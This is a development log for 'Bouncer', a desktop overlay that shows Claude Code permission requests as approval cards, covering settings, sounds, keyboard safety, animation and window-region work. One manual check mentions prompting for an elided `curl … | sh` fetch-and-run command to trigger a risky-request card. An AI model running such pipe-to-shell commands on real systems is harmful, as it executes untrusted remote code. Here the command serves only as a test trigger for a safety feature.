- [x] Physics bounce stable at any frame rate (tests); squash / stretch to spec
- [x] Eyes look toward the cursor, blink, squish, dizzy, greeting, done cheer
- [x] Reduced motion: no bounce, breathing, tracking, blink or drop
- [x] Idle CPU ~0% measured over 60 s (hidden strip, idle pill)

Verify (2026-10-03, Windows, debug app + Vite dev, fixtures fed through the
relay on a private test pipe, scratch `BOUNCER_RULES`; page inspected over
WebView2's debug port, debug builds only):

- Idle CPU, 60 s, app + all WebView2 processes: hidden strip ~0 ms; idle
  pill 235 ms = 0.39% of one core (was 0.65% before blinks became two
  repaints; 0.1% with blinks off). The page requests no frames once settled
  except the blink's two repaints.
- Approval card: Allow disabled → enabled 604 ms after the card's first
  paint; nothing focused (`document.activeElement` is `BODY`); the ball's
  box never overlaps the card or its buttons (ball bottom 32 px, card top
  37 px) for a plain and a risky card; a card sent during the greeting
  replaces it at once.
- Reduced motion (emulated): 0 frames in 3 s while working, still pose;
  60 fps again when it's turned off.
- Moods in the app: greeting, idle, working, done (cheer tilt), needs ("!"),
  risky (red, flat mouth); all seven on `design/sheet.html` next to the
  prototype's "Meet Bouncer": same shapes and colors.
- Diff reread: no `innerHTML`, no `focus()`, ball text is static ("z", "!");
  the sheet page is dev-only (not in `dist`).

Manual checks (Charan, 2026-10-03, Claude Code 2.1.289, Windows, debug app,
playground session in `default` permission mode):

- [x] Launch greeting (seen after a page reload; in dev the first load can
  take up to ~40 s on a busy machine, so the greeting comes then)
- [x] Working: jumps while Claude Code works
- [x] Needs you: card with the hopping "!" (`curl … | head -40`); Deny
  reached Claude Code ("Denied by PermissionRequest hook")
- [x] Mouse: face follows the cursor and recentres, a click squashes without
  opening the island, four clicks make him dizzy, the label opens the list
- [x] Paused: grey, eyes shut, "z", doesn't look
- [x] Reduced motion (Windows "Animation effects" off): no motion
- [x] Idle: Task Manager shows Bouncer at 0%
- Not seen live: risky (Claude Code rewrote `curl … | sh` into `curl … |
  head -40`, which isn't risky; covered by the 2.1.288 fixture in the app),
  the cheer when a session finishes (not reported). `git status` ran
  without a request (Claude Code allows it on its own) and `hello.txt`
  already existed, so the first prompt raised no card.
- Feedback: the pill and the whole island feel small. Changed (decision 7: one 125% island scale).
- [x] Re-check (Charan, 2026-10-04): the session list at 125% and the
  word-free greeting (Bouncer alone, centred in the pill) look good.
- [x] Approval card at 125% (Charan, 2026-10-04, a real Write request):
  same proportions as the prototype, Bouncer clear of the card, Allow armed,
  the path wraps in its box. Not re-checked at 125%: the session detail.
- [x] An approval card is never covered, moved, delayed or unfocused (tests + by hand)
- [x] `json_values` skips escaped quotes, with a run-time fake-secret test
- [x] fmt, clippy, tests green locally and in CI; gitleaks rules checked before every push (merged as #10, tagged v0.5.0)


### Phase 5b audit (2026-10-04)

Scope (Charan): sounds; the settings screen with **Size**; the observe /
auto switch; keyboard access; screen reader order; contrast. Sources:
`main.rs` (tray, window, commands), `rules.rs` (`add`, `replace`, owner
checks), `hooks.rs` / `bin/bouncer.rs` (hook install), `styles.css`,
`size.ts`, the prototype (no settings screen in it yet), tauri 2.12.1
(`set_focusable`, `set_focus`, `additionalBrowserArgs`).

What exists: the window is created `focusable: false` (Phase 2: a card
never takes the keyboard, and one click on Allow / Deny leaves typing in
the terminal); the tray has Pause, Wipe history, Quit; `mode` lives in
`rules.toml`, written only by hand or by "Always allow" (`rules::add`:
read-back check, temp file + rename, owner-only); no sound; `size.ts` has
`SCALE = 1.25`.

Findings:

1. **No settings screen in the prototype.** The design rule says the
   prototype comes first: I draft a "Settings" state there (same tokens,
   rows, switches) and show it before building.
2. **Contrast (≥ 4.5:1) fails in three places**, measured from the
   prototype's colors: faint text `#6B7280` is 4.02 on the island and 3.61
   on raised (times, steps, notes); code line numbers `#4B5261` are 2.48;
   white on the red "rules" badge is 3.36. Smallest fixes: faint →
   `#7B8290` (5.04 / 4.52), line numbers → faint, the badge text → island
   color (5.79). Prototype first.
3. **Keyboard access without stealing focus.** `set_focusable` exists in
   tauri 2.12.1, so no plugin: the island stays non-focusable and becomes
   focusable only when the user opens it on purpose: tray "Open Bouncer" /
   "Settings…" (the tray is keyboard-reachable: Win+B on Windows) or the
   island's gear button. Esc or clicking elsewhere makes it non-focusable
   again. Clicking a card's buttons keeps today's behavior (typing stays in
   the terminal). A card arriving never moves focus. A global hotkey would
   need `tauri-plugin-global-shortcut` (a new dependency): not proposed.
4. **Sound and autoplay.** Web Audio, generated, no files. A page that was
   never clicked may not be allowed to start audio (Chromium autoplay
   policy); checked first in Implement. If blocked, the fix is a WebView2
   argument in `tauri.conf.json` (`--autoplay-policy=no-user-gesture-required`,
   keeping Tauri's own default arguments), no dependency. The AudioContext
   is suspended after each sound, so idle CPU stays ~0. macOS → Mac checks.
5. **Preferences (Size, Sound) need a home.** `rules.toml` is security
   policy; preferences go in their own `preferences.json` next to it
   (`serde_json`, already a dependency), with the same owner check and
   atomic write. Bad or missing file → defaults (Medium, sound on). Size
   is one of three values, never a free number.
6. **Mode switch** reuses the rules write: a new `set_mode` command takes
   only `"observe"` / `"auto"`, changes the one `mode = ...` line (or adds
   it), checks the file reads back as the same rules with the new mode,
   then replaces it atomically. The island shows the change like any edit.
7. **Not in Charan's 5b list, from the old plan:** hooks install /
   uninstall and "rules file" in settings. Installing from the island means
   writing `~/.claude/settings.json` with a diff + confirm in the island
   (security rule 6); opening the rules file in an editor needs an opener
   plugin (new dependency). Proposed: settings shows the rules file's path
   (text, copyable) and whether hooks are installed; install / uninstall
   stays in the `bouncer` CLI for the MVP.

Decisions (Charan, 2026-10-04):

1. **Keyboard on cards:** Tab order Deny, then Allow. Space on Allow works
   only once it is armed; Enter never approves. If the card in front
   changes while the island has focus, focus moves to the new card's Deny
   and Allow re-arms for 600 ms. "Always allow…" stays reachable and keeps
   its own confirm step (which arms too).
2. **Settings screen:** Size, Sound, Observe / Auto, Wipe history, and the
   rules file's location as plain copyable text. Hooks: status only
   ("installed" / "not installed: run `bouncer install-hooks`"). Install /
   uninstall stays in the CLI and moves to the Phase 9 installer; no button
   writes `~/.claude/settings.json` in 5b.
3. **Three sounds only:** needs you (a card, or a question in the
   terminal), risky (different, sharper), done (soft). None for
   auto-allowed or working, none while paused. One sound at a time;
   a repeat within 2 s is dropped.
4. **Contrast fixes as proposed** (faint `#7B8290`, line numbers use faint,
   red badge text dark), prototype first.
5. **Settings design approved** (prototype v0.8) with three fixes: the
   spec tables read on one line at any page width; Settings scrolls inside
   the island and the auto-allow confirm scrolls fully into view (at 125%
   on a 768-px-tall screen its buttons are fully visible: the island is
   never taller than the work area, then it scrolls); in the confirm, focus
   goes to Cancel, Esc cancels, Enter never turns auto on (spec rule 11).
6. **Sizes lowered** (Charan, after seeing 125% Settings): Small 100% /
   Medium 112% (default) / Large 125%. Settings is compact on its own (one-
   line hints, the rules path in 11-px wrapping mono, tighter rows), so at
   Medium it fits a 768-px screen without scrolling (checked: 507-px window
   on a 720-px work area, even with a 150-character dev path). Prototype
   v0.9 first.

Threats (5b):

| Threat | Fix |
| --- | --- |
| Auto mode switched on by accident | Turning auto on asks first (what auto means, risky still asks), and its confirm button arms like Allow (600 ms); turning it off doesn't ask |
| The page writes arbitrary text into `rules.toml` | `set_mode` takes an enum only; the backend edits the file and checks it reads back as the same rules with the new mode |
| Keyboard approves by accident | Allow is never focused automatically, Enter never approves (keydown blocked on Allow and "Add rule and allow"), Space only once armed; a new card in front while focused moves focus to its Deny and re-arms Allow; with no focus, a card's arrival never moves focus |
| The island takes the keyboard from the terminal | Focusable only after the user opens it on purpose; non-focusable again on Esc / blur; card buttons keep working without focus |
| `preferences.json` tampered or broken | Owner check as for `rules.toml`; only known values accepted, anything else → defaults |
| Sound wakes the CPU / annoys | Three short generated sounds, one at a time, repeats within 2 s dropped, context suspended after; mute saved; none while paused |
| Unreadable text | All text ≥ 4.5:1 (fixes above); color is never the only signal (existing rule) |
| Screen reader reads the island out of order | DOM order = reading order (head, card: who, what, reason, command, buttons); the card is announced once on arrival (`aria-live` polite, already on the island) |

7. **The settings button is a cog** (Charan): the first icon, a circle with
   eight rays, read as a light / dark theme switch. Prototype v0.10 first.

Verify (2026-10-04, Windows 1366 × 768, debug app, fixtures through the
relay on a private test pipe, scratch `BOUNCER_RULES`; page driven over
WebView2's debug port with focus emulated, so the OS focus was never taken):

- Settings at Medium (112%): 493 × 572 window on a 720-px work area, no
  scrolling; with the auto-allow confirm open the body scrolls and both
  confirm buttons are fully in view; focus on Cancel.
- Size: Small / Medium / Large saved to `preferences.json` and applied at
  once; Large is capped to 137% by the 40% rule on a 1366-wide screen.
- Mode: confirm opens in view, focus on Cancel, "Turn on" disabled for
  600 ms, Esc cancels, Enter does nothing, turning on writes `auto` (only
  that line), turning off doesn't ask; the island shows "Rules changed".
- Sounds: a new card → two sine notes, risky → two triangle notes, a
  finished session → one bell, muted → none; the audio context is
  suspended ~0.5 s after each. WebView2 lets an unclicked page play sound,
  so no browser argument was needed.
- Keyboard: a new card focuses its Deny; Tab skips an unarmed Allow and
  stays inside the island; Enter on an armed Allow does nothing; Space on
  Deny denies, Space on an armed Allow allows; the next card after a
  decision focuses its Deny and re-arms; settings controls in order, focus
  kept across re-renders; Esc closes settings and the list.
- Found and fixed: a card queued behind the "Allowed / Denied" message
  could arm while hidden (older than 5b); it now arms when it appears.
- Idle CPU, 60 s, app + WebView2: hidden strip 78 ms (0.1%), idle pill
  250 ms (0.4%, the blinks); no change from 5a.
- Contrast: every text color ≥ 4.5:1 on island and raised (faint 5.04 /
  4.52, risky badge 5.79); the "!" icon in a risk reason is a graphic
  (3.36, over the 3:1 for icons).
- Diff reread: no HTML sinks; every new command takes known values only
  (size names, mode names, booleans); the hook status reads Claude Code's
  settings file (≤ 1 MB) and returns only a word.

Manual checks (Charan, 2026-10-04, Claude Code 2.1.289, Windows):

- [x] Tray "Settings…": Tab moves through the controls; Size changes at once
- [x] After clicking the terminal, Esc goes to the terminal (the island gave
  the keyboard back, as designed; an open confirm stays until Cancel)
- [x] A real Write card: Tab skips the unarmed Allow (ring on "Always allow…")
- Reported "Enter and Space both turn auto on / off". Re-checked with real
  key presses over the debug port: Enter on the switch turns auto off (off
  never asks) and only opens the confirm when it's off; Enter on "Turn on
  auto-allow" does nothing; only Space or a click turns auto on. Found on
  the way: focus fell to nothing when a confirm closed; it now returns to
  the switch (or "Wipe…").
- [x] Second round (Charan, 2026-10-04): the soft "needs you" notes on a
  card; tray "Open Bouncer"; Tab order Deny → Allow once → Always allow;
  Enter does nothing on Allow, Space allows; the "done" bell; the risky
  card; mute; Narrator reads the island when you go to it.
- Found: opening from the tray with a card up didn't put focus (or the
  ring) on Deny; now it does, and the ring shows whenever the island has
  focus (it only has focus when opened on purpose).
- Narrator doesn't announce a new card by itself: the island never takes
  focus, and Narrator speaks live regions of the focused window. Decision
  (Charan): accept for now; the sounds alert; revisit in Phase 9.
- "Still asking in the terminal" after answering No there: Claude Code
  sends nothing after a No in its own prompt (no Stop either), so Bouncer
  can't know; "Waiting in terminal" after 2 quiet minutes, cleared by the
  session's next event (Phase 4 limit). A Yes after a timeout sends
  PostToolUse and clears it (no live recording yet; unit test). Found and
  fixed: a Yes in Claude Code's prompt while the card was still up left the
  card for ~100 s and then marked the session "asks in terminal"; now the
  tool's PostToolUse (same tool and input), Stop, a new prompt or the
  session's end clears that card ("answered in terminal").

Phase 5b is done when:

- [x] Settings state in the prototype, approved; then built to it (Size,
  Sound, Observe / Auto, Wipe history, rules file path, hook status)
- [x] Size Small / Medium / Large, saved, applied at once (40% cap kept)
- [x] Sounds (needs you, risky, done), generated; mute saved; none while
  paused; one at a time, repeats within 2 s dropped; idle CPU still ~0%
- [x] Observe / auto switch: confirm to turn on, `set_mode` checked write
- [x] Keyboard: open from the tray, Tab through settings and cards, Esc
  closes; Enter never approves; Space on Allow only when armed; a new card
  moves focus to its Deny; focus never taken from the terminal by a card
  (debug port + Charan by hand)
- [x] Contrast ≥ 4.5:1 everywhere (prototype first); screen reader order
  checked by hand (Narrator reads the island in order when you go to it; it
  doesn't announce a new card by itself: accepted, Phase 9)
- [ ] fmt, clippy, tests green locally and in CI; gitleaks rules checked
  before every push (local green: 130 Rust + 36 frontend; gitleaks clean)

## Phase 5c — Island motion

Charan, 2026-10-04. Its own PR, all four stages, after 5b is merged.

- **Grows out of the top edge** like the prototype: hidden → peek on
  hover → pill → open, morphing with the 320 ms spring. Growing: resize the
  window first, then animate inside it. Closing: animate first, then
  shrink the window.
- **Never animate an approval card's arrival**; the 600 ms arm still
  counts from when the card is fully visible.
- **The ticker** (the pill's step label) shows `+N −M` line counts for Edit
  / Write, computed from the hook input (Edit: old vs new text; Write: the
  new text's lines, since the old file is never read). Only the numbers are
  stored (two new activity-log fields), never the text.
- **Reduced motion** turns all of it off.
- Audit to settle: what "fully visible" means in the window-resize timing;
  where `+N −M` sits in the pill; MultiEdit; the activity-log field change.

### Phase 5c audit (2026-10-04)

Sources: the prototype (`.island` transitions, `.body` rise, Build spec
"Motion"), `main.ts` (`setShape`, `report`, `front` / arm, peek),
`styles.css`, `main.rs` (`fit`, `lay_out`, `place`), `code.rs` / `diff.rs`,
`activity.rs` (`Entry`), `approvals.rs` (session step and code pane).

What exists: width and corner radius move with a CSS transition (320 ms
spring, 200 ms ease-out when closing); height jumps. While the width moves,
the page reports a new size on every frame and `growUntil` keeps the larger
one, so the window is resized ~20 times per change and grows *with* the
island, not before it. `.body` and `.detail` replay the 6-px "rise" every
time they're rebuilt: when a card arrives (an animated card arrival) and on
every 30-s clock re-render. The hidden strip sits at the screen's top edge,
every other state 8 px below it, so hidden → pill moves the window.

Findings:

1. **The prototype has no height morph, no window and no peek.** Drawn
   first (v0.11): a "Phase 5c" row with "Play: wake, open, close" (strip →
   peek → pill → sessions → ticker pill → strip), the ticker pill, "Show
   window" (a dashed box for the OS window), "Slow ×4" (to see the order)
   and "Reduced motion". Hovering the strip for 300 ms peeks the pill.
2. **The morph is one Web Animation** on the island (width, height,
   min-height, top, radius, color) from the box it had to the box it gets:
   native, no dependency. Growing: 320 ms spring; closing: 200 ms ease-out
   (spec). A change in the middle starts from where the island is.
3. **Window order.** Growing: the page asks for the larger of the current
   and new size, the island waits at its old box until the viewport is that
   big (the page's `resize` event; 150 ms at most), then animates. Closing:
   the island animates inside, then the page asks for the new size. Two
   window resizes per change instead of one per frame. The spring
   overshoots ≤ 3% of the change (the curve peaks at 1.03): at most ~7 px a
   side for pill → wide, inside the 20 / 32 px shadow margin, so never cut.
4. **Grows out of the top edge.** The 8-px gap moves inside the window
   (top padding) and the window sits at the work area's top edge, so strip
   and pill share the window's top and the morph is continuous, like the
   prototype's `top: -1 → 8`. Cost: an 8-px transparent band above the
   island that takes clicks (the shadow margin already does on three
   sides). An island dragged elsewhere still hides to the top-centre strip
   (as now); it grows from its own top edge at its spot.
5. **A card is never animated in.** A card at the front (new, or the next
   one after "Allowed / Denied") is drawn at full size at once: no morph,
   no rise, one window resize. Nothing morphs while a card is in front, so
   its buttons never move. **"Fully visible"** = the viewport holds the
   whole island (2-px tolerance); the 600 ms arm starts then, not when the
   card was drawn (today: drawn). Until then Allow is disabled with an empty
   fill. The backend's own 600 ms counts from the request, earlier, so the
   page stays the stricter one. If the window never gets big enough, Allow
   never arms: fail safe (Deny and the terminal still work).
6. **Rise only when growing**, never on a re-render or a card (fixes the
   replay every 30 s).
7. **`+N −M`.** `code::line_counts(tool, input)` with the code pane's own
   `line_ops`: Edit old vs new; MultiEdit the sum over its edits; Write
   `+N` only (the old file is never read, so no `−`); NotebookEdit and other
   tools none; `replace_all` counts once (how many places needs the file).
   The session view sends `lines: [added, removed | null]`; the activity log
   gets two optional numbers `added`, `removed` (old day files still read;
   missing = none). In the pill: after the label, before a badge, 12-px mono
   tabular, `+N` green, `−M` (U+2212) red; the label shortens first, the
   numbers are never cut; the signs are the words. Only on the working pill
   for the session it shows; not in rows or the rail (not asked).
8. **Huge edits** (found on the way): `line_ops` keeps an n × m table; a
   10,000-line edit is a 400 MB table, and 5c would run it up to three times
   per edit (code pane, ticker, log). Proposed: above 1,000,000 cells it
   treats the edit as a whole replacement (all old lines `−`, all new `+`),
   so the pane and the counts stay correct-ish and memory stays ≤ 4 MB.
9. **Reduced motion:** no morph, no rise, the window resizes in one step
   (as today); the arm still counts from fully visible. Read live from
   `matchMedia`, so a change applies at once.
10. **Hidden means hidden:** the animation ends; no frame loop, no timers.

Threats (5c):

| Threat | Fix |
| --- | --- |
| An animation hides or delays a card, or moves its buttons | A card's arrival is never animated; nothing morphs while a card is in front; the arm starts when the card is fully visible |
| A click lands on Allow during a resize | Allow is disabled until 600 ms after the card is fully visible; the backend refuses an allow within 600 ms anyway |
| Window and island disagree (cut-off island, clicks lost) | Window grows to the larger size before the island moves, shrinks only after it stops; overshoot fits the shadow margin |
| Line counts carry agent text | `line_counts` returns two integers; the log stores numbers only (test) |
| A huge edit eats memory in the app | `line_ops` table capped at 1,000,000 cells, then whole-replacement counts |
| Motion sickness | Reduced motion: no morph, no rise, no overshoot |
| Idle CPU | Web Animations run only during a change; settled or hidden, nothing runs |

Decisions (Charan, 2026-10-04): prototype v0.11 approved, and all three
proposals: (1) the 8-px gap goes inside the window; (2) the line counts as
in finding 7; (3) `line_ops` capped at 1,000,000 cells.

Verify (2026-10-04, Windows 1366 × 768 at 100%, debug app built to a
scratch target and run beside Charan's own dev instance, fixtures through the
relay on a private test pipe, scratch `BOUNCER_RULES`; page sampled every
frame over WebView2's debug port; the OS focus was never taken):

- Strip → pill (a session starts): the window grew to 368 × 88 while the
  island was still the 5-px strip, then the island sprang open (top 0 → 9,
  peak 3 px over) and settled in ~330 ms; nothing left running.
- Pill → open: window 493 × 164 first, then the spring (peak 4 px over,
  inside the shadow margin). Open → pill: 200 ms ease-out inside the held
  window, then the window shrank.
- A card: drawn at full size in one frame, no animation; Allow stayed
  disabled with an empty fill until the window held it, the fill started
  then, and Allow was armed 617 ms after fully visible. Once (the first
  card after launch) the window took ~2 s to grow: Allow kept waiting the
  whole time, as designed.
- "Always allow…" with a card up: no morph; its button arms in 600 ms.
- Ticker: Edit `+3 −1`, Write `+4` only, Bash none; with a long file name
  the label shortens and the numbers stay whole (screenshot to Charan).
- Reduced motion (emulated): open and close in one step, no animation.
- Hidden: no animations, the window is the strip. The pill's window sits at
  the work area's top (0) with the island 9 px down inside it (8 × 112%).
- Idle CPU, settled idle pill, app + WebView2: 78 ms in 30 s (0.26%).
- Found and fixed: on Deny, the backend's next view (card gone) arrived
  before `decide` answered, so the pill flashed and the island grew back
  for "Denied" (a one-frame flash before 5c, a visible bounce with the
  morph). The message now shows from the press and is dropped if the
  backend refuses.
- Diff reread: no HTML sinks; the ticker is two numbers rendered with
  `textContent`; the log gains two integers; `line_ops` capped.

Manual checks (Charan, 2026-10-05, Claude Code 2.1.289, Windows):

- [x] A Write card appears at once; Allow's fill starts once it's fully
  shown; Deny shows "Denied" at once (no pill flash), then the island shrinks
- [x] "Always allow…" opens its preview with nothing moving
- [x] Tray "Open Bouncer" with a card up: the ring is on Deny at once
- Found: hovering the wake strip with no session made it flicker between
  strip and pill (the × too). Cause: with the gap inside the window, a mouse
  resting on the strip is in the gap above the peeked pill, which counted as
  leaving the island. Fixed: the peek ends when the mouse leaves the window
  (reproduced and re-checked over the debug port).
- Found: in Session detail the diff lines sat side by side in narrow green
  columns: the ticker's `.lines` class clashed with the code pane's. Fixed
  (renamed `.ticker`, prototype too); checked in the real window.
- [x] Strip hover (after the fix), drag, reduced motion; the ticker shows
  on the pill (with every edit needing a card, the card covers it: seen with
  "accept edits")
- Asked (Charan): react faster on hover. Decision: the pill peeks after
  **200 ms** (was 300; prototype v0.12 first).
- Found: closing (and opening) shows the pill ~60 px to the side, cut off,
  for one frame. Filmed and measured (Bouncer's x in every frame): when the
  window moves, WebView2 shows its old picture at the new spot for a frame.
  Moving and resizing in one native `SetWindowPos` call didn't help. Known
  limit of 5c. Decision (Charan): merge 5c as is; fix it in its own small
  PR right after, before 5d (see "Island window region" below).

Phase 5c is done when:

- [x] Prototype v0.11 approved (morph, window order, peek, ticker, reduced motion)
- [x] Strip → pill → open → wide grow from the top edge with the 320 ms
  spring, close with 200 ms ease-out; window grows first, shrinks last
- [x] A card appears at once; its arm counts from fully visible; nothing
  morphs under a card (checked over the debug port, frame by frame)
- [x] `+N −M` on the pill for Edit / MultiEdit, `+N` for Write; two numbers
  in the activity log, never the text; old log files still read
- [x] `line_ops` capped for huge edits
- [x] Reduced motion: all off; idle CPU still ~0%
- [ ] fmt, clippy, tests green locally and in CI; gitleaks rules checked
  before every push (local green: 137 Rust + 41 frontend; gitleaks clean)

## Island window region (after 5c, before 5d)

Charan, 2026-10-05. Its own small PR. Fixes 5c's one-frame jump: on
Windows the window stops moving while the island shows; it keeps one fixed
size and a window region (`SetWindowRgn`) marks the island's part. Outside
the region nothing is drawn and clicks reach the window underneath (tested
by hand on the test window with `WindowFromPoint`: outside → the window
below; on the pill → Bouncer).

- Windows only; macOS keeps resizing until it's tested there.
- The `unsafe` Windows calls live in one small module.
- Fail safe: if any region call fails, fall back to today's resizing; never
  leave a big invisible window catching clicks.
- A test that the region always contains the card's buttons.
- Prove with `WindowFromPoint` that clicks outside the island reach the
  window underneath.

### Island window region audit (2026-10-05)

Sources: `main.rs` (`fit`, `lay_out`, `place`, `keep_on_screen`, drag),
`main.ts` (`report`, `settle`, `armIfVisible`), `size.ts`, tauri 2.12.1 /
tauri-runtime-wry 2.12.1 / tauri-macros 2.7.1 sources.

What exists: the page reports its box (island + shadow margin + top gap) and
the window is resized and moved to exactly that box, so every width change
moves the window's left edge (the one-frame jump).

Findings:

1. **The frame.** The window gets one size that fits every view at the
   current Size and screen: the widest and tallest page (pill, open, wide,
   each at its own scale), computed by the page in `size.ts` and sent with
   the box. The box is drawn top-centred in it (as now), so only the region
   changes between views; the window moves only when the Size, the screen,
   hidden ↔ a dragged spot, or a drag changes it. With the island at its
   usual top-centre spot, hiding to the strip doesn't move it either.
2. **Region = the box**, in window pixels, top-centred. The frame is
   centred on the box and never passes the work area (the box's own
   monitor), so it can't straddle monitors with another DPI. Near a screen
   edge the frame narrows (then a width change there can still jump once).
3. **"Fully visible" needs a new signal**: the viewport is the frame now,
   always bigger than the card. `fit` is a sync command, so it runs on the
   main thread, and `run_on_main_thread` runs inline there
   (tauri-runtime-wry `send_user_message`): when the page's `fit` call
   returns, the region is set. The page keeps the last confirmed size; the
   arm starts when it holds the card (and the viewport does), and a grow
   morph starts when its `fit` returns (150 ms at most, as now).
4. **One small `unsafe` module** (`crates/app/src/region.rs`, Windows only):
   `SetWindowPos`, `CreateRectRgn`, `SetWindowRgn`, `DeleteObject`, declared
   from `user32` / `gdi32` (system libraries, no new crate). The geometry is
   a plain function next to it, tested.
5. **Fail safe:** if the handle or any call fails, the window goes back to
   exactly the box (today's resizing) and any region is removed, so a big
   invisible window never catches clicks. A refused region is freed.
6. **Drag:** the user drags the frame; the anchor is still its top centre.
   "Out of reach" is judged from the box's centre, not the frame's.
7. macOS: unchanged (resizes to the box) until it's tested there.

Threats:

| Threat | Fix |
| --- | --- |
| A big invisible window catches clicks | Region = the box; any failure → window back to the box, region removed |
| A card shows (or arms) clipped by an old region | Arm starts only after the `fit` holding the card has returned (region set) |
| The frame crosses monitors (DPI change) | Frame kept inside the box's work area |
| Leaked GDI region | Freed when `SetWindowRgn` refuses it (the system owns it otherwise) |
| `unsafe` misuse | One module; only our own window handle, on the main thread; no pointers but the handle |

Verify (2026-10-05, Windows 1366 × 768 at 100%, debug build in a scratch
target beside Charan's dev app, private test pipe; window and region read
with `GetWindowRect` / `GetWindowRgnBox`, clicks checked with
`WindowFromPoint`, nothing clicked):

- Strip, pill and open list: the window stayed at 303,0 760 × 628 for all
  three; only the region changed (204 × 6, 370 × 88, 495 × 164).
- Clicks: inside the region → Bouncer; 15 px left of it and 15 px below it
  → the window underneath, in every view.
- A drag (the frame moved to mid-screen): the island followed, and the frame
  shrank to the work area (760 × 470).
- Filmed three opens and three closes at that spot and tracked Bouncer's x
  in every frame: no frame jumps off and back (the same check catches 5c's
  jump, 156 → 218 → 156).
- A card: drawn in one frame with Allow waiting; the arm started when the
  `fit` showing it returned (one frame later), armed 602 ms after. Deny,
  Allow once and Always allow… all lie inside the region on screen.
- Fallback (`BOUNCER_NO_REGION=1`, debug only): no region, the window is
  exactly the island's box again (368 × 88, 493 × 164); a click just
  outside it reaches the window underneath.
- Idle CPU, settled idle pill, app + WebView2, 60 s: region on 1.28% /
  1.41%, region off 1.38%: the region adds nothing. (Higher than 5c's
  single 30-s 0.26% on a busier machine: Charan's dev app ran alongside.)
- Diff reread: the only `unsafe` is `region::win` (four Windows calls on our
  own handle, main thread); a refused region is freed; every failure path
  clears the region and sizes the window to the box.

Manual checks (Charan, 2026-10-05, Claude Code 2.1.289, Windows):

- [x] Open / close and session detail: no flicker or jump
- [x] Clicks right next to and below the island reach what's underneath
- [x] Drag the island, open / close there
- [x] Strip hover (200 ms); a card arrives and arms as before
- Asked: a minimize / maximize / close set next to the island. They're the
  terminal's own caption buttons behind it (Bouncer's window has no
  decorations); visible in the 5c screenshots too.

Done when:

- [x] Opening and closing (pill ↔ open ↔ wide) never move the window; filmed
  and measured: no one-frame jump
- [x] `WindowFromPoint`: outside the island → the window underneath; on the
  island → Bouncer
- [x] A test that the region always holds the card's buttons
- [x] Forced failure falls back to box-sized resizing (test + by hand)
- [x] Arm still counts from fully visible; idle CPU unchanged by the region
- [x] fmt, clippy, tests green locally and in CI; gitleaks rules checked
  (local green: 142 Rust + 42 frontend; PR 13 CI green, merged 2026-10-05)

## Phase 5d — Sound pack (current)

Charan, 2026-10-04. Its own PR, all four stages, after 5c is merged. 5b
ships the first three sounds (needs you, risky, done) as they are.

- **Theme: Bouncer is a club bouncer.** Sounds are funny and still say what
  happened (Charan, 2026-10-04).
- **All generated in code (Web Audio), no files**, each under ~1 s, nothing
  copied from Coucou or anywhere else.
- **Starting set** (Playful style):

  | Event | Sound |
  | --- | --- |
  | Launch | "yo!" whistle |
  | New session | door chime |
  | Needs you (card or question) | knock-knock + rising "ahem?" |
  | Risky request | record scratch + low buzzer |
  | Allowed | velvet rope "pop" + ding |
  | Denied | door slam "bonk" |
  | "Always allow" rule added | VIP stamp "ka-chunk" |
  | Auto-allowed | tiny click (off by default) |
  | Session done | mini "ta-da!" |
  | A tool failed / error | sad trombone |
  | Welcome back (away summary) | rising "heyyy" |
  | Poke (click on Bouncer) | boing |
  | Dizzy | cartoon whirl |
  | Paused | snore "zzz" |
  | Resumed | "bip-bip!" |
  | Auto-allow turned on | "cha-ching" |
  | History wiped | eraser whoosh |

- **Styles:** Playful (default); Soft and Retro are calmer versions of the
  same ideas (same rhythm and contour, gentler timbre / chiptune).
- **Risky and needs you stay clearly different from the fun ones** (lower,
  harsher, insistent), so they're never ignored, in every style.
- **Settings:** volume, the style choice and per-sound on / off.
- **Rules:** never more than one sound at a time; a repeat within 2 s is
  dropped; frequent events stay quiet by default; nothing while paused;
  idle CPU ~0% (the audio context suspended between sounds).
- **Design first:** a listen-and-pick page in the prototype with every sound
  in every style, so Charan hears them all before they're built.
- Audit to settle: which events are "frequent" (auto-allowed, session
  started?), what "a tool failed" is in the hook data, the greeting sound
  vs the no-sound-at-launch rule (5b: the first view is quiet), and how
  volume and per-sound choices are stored (`preferences.json`).

### Phase 5d audit (2026-10-06)

Sources: this section, `sound.ts` (`cue`, `allowed`, `play`), `main.ts`
(where `cue` runs, the greeting, `savePrefs`), `prefs.rs`, `hooks.rs` (the
hook events we install), the 2.1.288 "denied in terminal" fixture, the
prototype (Settings, Build spec).

What exists (5b): three cues (needs you, risky, done) from two sine /
triangle notes each; one master on / off in `preferences.json`; one sound
at a time, a repeat within 2 s dropped, nothing while paused, the audio
context suspended after each sound; the first view only records what's
known (a reload stays quiet).

Findings:

1. **Order.** Design first: the listen-and-pick board goes into the
   prototype (v0.13) with all 17 sounds × 3 styles, made the same way the
   app will make them (oscillators, filtered noise, envelopes; no files, no
   samples). Charan marks each one keep / change. Nothing goes into the app
   until every sound is a keep.
2. **One recipe per sound, three styles.** Each sound is written once as a
   list of parts (tone or noise, timing, pitch contour); the style only
   changes the timbre: Playful as written; Soft = sine, slower attack, low-
   pass, quieter noise; Retro = 25% pulse / triangle, pitch stepped to
   semitones at 30 steps/s, crunchy noise. So rhythm and contour can't drift
   between styles.
3. **Alarm parts stay harsh in every style.** Needs you and risky mark
   their parts as alarms: in Soft they keep a triangle / sawtooth through a
   low-pass instead of becoming sine, and risky stays the lowest sound in
   the set. Both stay under 1 s.
4. **"A tool failed" has no event yet.** Bouncer installs `SessionStart`,
   `SessionEnd`, `UserPromptSubmit`, `PreToolUse`, `PostToolUse`,
   `PermissionRequest`, `Notification`, `Stop`; Claude Code reports a failed
   tool in `PostToolUseFailure`, which we don't install. Adding it changes
   what's written into `~/.claude/settings.json` (an install change):
   **Charan's call** after the picks. Until then the sad trombone is only
   on the board.
5. **Frequent events.** Auto-allowed fires on every tool call in auto mode:
   off by default (as planned). Tool failed (if added) can be frequent too:
   off by default. New session (once per session), allowed / denied / always
   allow / poke / dizzy (Charan's own clicks), done (once per turn), paused /
   resumed, auto on, history wiped (his own actions): on.
6. **Launch vs the quiet first view.** The greeting runs on the first view
   (`greetUntil`), which is the app's launch. Proposal: the "yo!" plays with
   the greeting only; every other first-view sound stays quiet, as now.
   A reload in dev replays it (prod has no reload).
7. **Priority when two fire together:** risky, then needs you, then the
   rest; only one plays. The 2-s repeat drop stays; "longest sound" becomes
   the longest in the pack (checked by a test over the recipes, ≤ 1 s).
8. **Paused:** the snore is the pause itself; after it nothing plays until
   resumed (the "bip-bip" is the resume).
